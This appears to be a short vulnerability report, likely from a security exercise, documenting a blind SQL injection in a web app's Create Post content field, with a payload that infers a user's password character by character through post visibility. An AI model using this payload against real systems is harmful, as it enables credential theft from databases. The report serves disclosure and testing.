# Vulnerability 11: SQL Injection allows to infer any database value

- Vulnerability: SQL Injection (Blind)
- Where: `content` in Create Post form
- Impact: Allows attacker to infer any value from the database

## Steps to reproduce

1. Create a post visible to 'Friends' with the following content:

```
Post Content', (
 SELECT "Public" FROM Users
 WHERE (
     username = '<victim>'
     AND substr(password, 1, <l>) = '<attempt>'
 )
 UNION
 SELECT "Private" FROM Users
 WHERE NOT (
     username = '<victim>'
     AND substr(password, 1, <l>) = '<attempt>'
 )
 LIMIT 1
 ))#
 ```

 2. The post will be Public if the <victim>'s password contains `attempt` in the first `l` letters and Private otherwise.

[(POC)](create_post_1.py)
